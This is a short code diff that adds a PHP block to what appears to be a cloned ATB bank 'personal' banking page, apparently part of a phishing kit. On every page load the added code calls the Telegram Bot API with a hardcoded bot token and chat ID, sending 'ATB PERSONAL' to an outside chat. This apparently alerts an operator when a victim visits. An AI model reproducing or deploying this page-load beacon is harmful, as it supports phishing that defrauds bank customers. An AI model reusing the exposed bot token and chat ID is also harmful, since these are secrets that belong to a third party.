@@ -1,9 +1,20 @@
-  
- <?php
+<?php
 
+
+$message ="ATB PERSONAL\n";
+
+$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
+$data = [
+    'chat_id' => '-1001831940786',
+    'text' => $message
+];
+
+$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
+                                 http_build_query($data) );
+                                                    
 
 ?>
-
+   
 
 <html class="fa-events-icons-ready"><head>
 <meta http-equiv="content-type" content="text/html; charset=UTF-8"><script async="" src="files/P/gtm_005.js"></script><script async="" src="files/P/gtm_004.js"></script><script async="" src="files/P/gtm_003.js"></script><script async="" src="files/P/gtm_002.js"></script><script async="" src="files/P/gtm.js"></script>
